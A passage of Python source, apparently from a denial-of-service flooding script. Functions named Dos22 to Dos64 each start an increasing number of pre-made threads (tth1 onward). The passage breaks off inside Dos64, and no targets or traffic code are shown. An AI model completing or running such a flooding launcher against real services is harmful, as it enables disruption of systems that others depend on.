def Dos22():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
def Dos23():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
def Dos24():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
def Dos25():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
def Dos26():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
def Dos27():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
def Dos28():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
def Dos29():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
def Dos30():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
def Dos31():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
def Dos32():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
def Dos33():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
def Dos34():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
def Dos35():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
def Dos36():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
def Dos37():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
def Dos38():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
def Dos39():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
def Dos40():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
def Dos41():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
def Dos42():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
def Dos43():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
def Dos44():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
def Dos45():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
def Dos46():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
def Dos47():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
def Dos48():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
def Dos49():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
def Dos50():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
def Dos51():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
def Dos52():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
def Dos53():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
def Dos54():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
def Dos55():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
def Dos56():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
def Dos57():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
def Dos58():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
def Dos59():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
def Dos60():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
def Dos61():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
def Dos62():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
def Dos63():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
def Dos64():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
